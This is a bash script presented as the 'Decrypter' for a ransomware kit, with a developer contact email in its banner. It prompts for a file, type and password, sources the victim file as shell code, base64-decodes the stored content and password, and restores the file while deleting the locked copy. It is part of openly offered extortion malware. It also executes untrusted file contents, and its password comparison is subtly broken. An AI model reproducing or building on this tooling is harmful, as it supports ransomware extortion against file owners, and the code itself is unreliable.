#!/bin/bash
clear;
echo "
################ [Decrypter]
#  Ransomware  # Contact : developerpaceusa@gmail.com
################";
echo "";
read -p "File Path : " pathfile;
read -p "File Type : " format;
read -p "Password  : " password;
sleep 2
echo "#########################";
echo "File Path => $pathfile";
sleep 0.5
echo "Password  => $password";
sleep 0.5
echo "File Type => $format";
sleep 0.5
echo "#########################";
sleep 0.5
echo "Decrypting...";
sleep 2
source $pathfile;
content2="$(echo -n ${content} | base64 -d)";
pass2="$(echo -n ${pass} | base64 -d)";
if (( ${pass2} == "$password" )); then
  echo "${content2}" >> "$pathfile.$format";
  rm $pathfile;
  echo "[+] Success!";
else
  echo "Wrong Password!";
  echo "[+] Failed!";
fi
